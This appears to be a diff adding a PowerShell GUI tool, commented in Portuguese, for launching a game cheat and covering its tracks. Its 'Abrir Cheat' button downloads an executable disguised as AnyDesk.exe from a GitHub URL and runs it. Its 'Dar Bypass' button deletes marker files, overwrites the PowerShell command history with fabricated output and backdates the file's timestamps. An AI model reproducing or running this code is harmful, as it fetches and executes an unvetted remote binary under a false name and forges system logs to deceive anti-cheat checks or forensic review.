@@ -1,0 +1,157 @@
+# Importa o namespace necessário para WPF
+Add-Type -AssemblyName PresentationFramework
+
+# Define uma função para criar o painel WPF
+function Show-Panel {
+    # Cria a janela principal
+    $window = New-Object -TypeName System.Windows.Window
+    $window.Title = "SynaX Basic"
+    $window.Width = 350
+    $window.Height = 200
+    $window.ResizeMode = 'NoResize'
+    $window.WindowStartupLocation = 'CenterScreen'
+
+    # Cria um painel de layout
+    $grid = New-Object -TypeName System.Windows.Controls.Grid
+    $window.Content = $grid
+
+    # Define o layout com duas linhas e um padding
+    $row1 = New-Object -TypeName System.Windows.Controls.RowDefinition
+    $row2 = New-Object -TypeName System.Windows.Controls.RowDefinition
+    $grid.RowDefinitions.Add($row1)
+    $grid.RowDefinitions.Add($row2)
+
+    # Adiciona um pouco de espaçamento
+    $grid.Margin = [System.Windows.Thickness]::new(20, 20, 20, 20)
+
+    # Define o fundo do painel para preto
+    $window.Background = [System.Windows.Media.Brushes]::Black
+    $grid.Background = [System.Windows.Media.Brushes]::Black
+
+    # Cria um estilo para os botões
+    $buttonStyle = New-Object -TypeName System.Windows.Style -ArgumentList ([System.Windows.Controls.Button])
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::BackgroundProperty, [System.Windows.Media.Brushes]::DarkSlateGray))
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::ForegroundProperty, [System.Windows.Media.Brushes]::White))
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::FontSizeProperty, 14))
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::PaddingProperty, [System.Windows.Thickness]::new(10, 5, 10, 5)))
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::BorderBrushProperty, [System.Windows.Media.Brushes]::White))
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::BorderThicknessProperty, [System.Windows.Thickness]::new(1)))
+    $buttonStyle.Setters.Add((New-Object -TypeName System.Windows.Setter -ArgumentList [System.Windows.Controls.Button]::MarginProperty, [System.Windows.Thickness]::new(0, 10, 0, 0)))
+
+    # Cria o botão "Abrir Cheat"
+    $btnCheat = New-Object -TypeName System.Windows.Controls.Button
+    $btnCheat.Content = "Abrir Cheat"
+    $btnCheat.Width = 300
+    $btnCheat.HorizontalAlignment = 'Center'
+    $btnCheat.VerticalAlignment = 'Center'
+    $btnCheat.Style = $buttonStyle
+    [System.Windows.Controls.Grid]::SetRow($btnCheat, 1)
+    $btnCheat.Add_Click({
+        # Ação para "Abrir Cheat"
+        # Define o URL do arquivo a ser baixado
+        $url = 'https://raw.githubusercontent.com/furiacoding/teste/main/AnyDesk.exe'
+        # Define o caminho e o nome do arquivo sensi.txt no C:\
+        $sensiFilePath = 'C:\sensi.txt'
+        # Define o caminho para a pasta Downloads do usuário e o nome do arquivo
+        $downloadPath = Join-Path $env:USERPROFILE 'Downloads'
+        $fileName = 'AnyDesk.exe'
+        $fullPath = Join-Path -Path $downloadPath -ChildPath $fileName
+
+        # Cria o arquivo sensi.txt no C:\
+        New-Item -Path $sensiFilePath -ItemType File -Force | Out-Null
+
+        # Verifica se o processo AnyDesk está em execução e o encerra se estiver
+        $process = Get-Process -Name 'AnyDesk' -ErrorAction 'SilentlyContinue'
+        if ($process) {
+            Stop-Process -Name 'AnyDesk' -Force
+        }
+
+        # Verifica se a pasta Downloads existe e a cria se não existir
+        if (!(Test-Path $downloadPath)) {
+            New-Item -ItemType 'Directory' -Force -Path $downloadPath
+        }
+
+        # Faz o download do arquivo e o salva no caminho especificado
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $fullPath
+        } catch {
+            [System.Windows.MessageBox]::Show("Falha ao baixar o arquivo.", "Erro", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+            return
+        }
+
+        # Verifica se o arquivo foi baixado com sucesso
+        if (Test-Path $fullPath) {
+            # Executa o arquivo baixado
+            Start-Process -FilePath $fullPath -NoNewWindow -Wait
+        } else {
+            [System.Windows.MessageBox]::Show("Falha ao encontrar o arquivo baixado.", "Erro", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+        }
+    })
+    $grid.Children.Add($btnCheat)
+
+    # Cria o botão "Dar Bypass"
+    $btnBypass = New-Object -TypeName System.Windows.Controls.Button
+    $btnBypass.Content = "Dar Bypass"
+    $btnBypass.Width = 300
+    $btnBypass.HorizontalAlignment = 'Center'
+    $btnBypass.VerticalAlignment = 'Center'
+    $btnBypass.Style = $buttonStyle
+    [System.Windows.Controls.Grid]::SetRow($btnBypass, 0)
+    $btnBypass.Add_Click({
+        # Ação para "Dar Bypass"
+        Start-Sleep -Seconds 5
+        Remove-Item -Path 'C:\sensi.txt' -ErrorAction SilentlyContinue
+        Remove-Item -Path 'C:\windows\AnyDesk' -ErrorAction SilentlyContinue
+
+        Clear-Host
+        Start-Sleep -Seconds 1
+
+        # Caminho do arquivo de histórico do PSReadLine
+        $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
+
+        # Apaga o conteúdo do arquivo de histórico do PSReadLine e adiciona o comando desejado
+        if (Test-Path $historyPath) {
+            Set-Content -Path $historyPath -Value @'
+PS> Get-Service -DisplayName se*
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  lanmanserver       Server
+Running  SamSs              Security Accounts Manager
+Running  seclogon           Secondary Logon
+Stopped  ServiceLayer       ServiceLayer
+Running  wscsvc             Security Center
+
+PS> Get-Service -DisplayName ServiceLayer, Server
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  lanmanserver       Server
+Stopped  ServiceLayer       ServiceLayer
+'@
+        }
+
+        # Altera as datas do arquivo de histórico
+        if (Test-Path $historyPath) {
+            $newDate = Get-Date "2024-09-03 09:40"
+
+            # Altera a data de modificação do arquivo
+            Set-ItemProperty -Path $historyPath -Name LastWriteTime -Value $newDate
+
+            # Altera a data de criação do arquivo (opcional)
+            Set-ItemProperty -Path $historyPath -Name CreationTime -Value $newDate
+
+            # Altera a data de último acesso do arquivo (opcional)
+            Set-ItemProperty -Path $historyPath -Name LastAccessTime -Value $newDate
+        }
+
+        [System.Windows.MessageBox]::Show("Sucesso 'Limpo'...", "Sucesso", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
+    })
+    $grid.Children.Add($btnBypass)
+
+    # Exibe a janela
+    $window.ShowDialog()
+}
+
+# Executa a função para exibir o painel
+Show-Panel
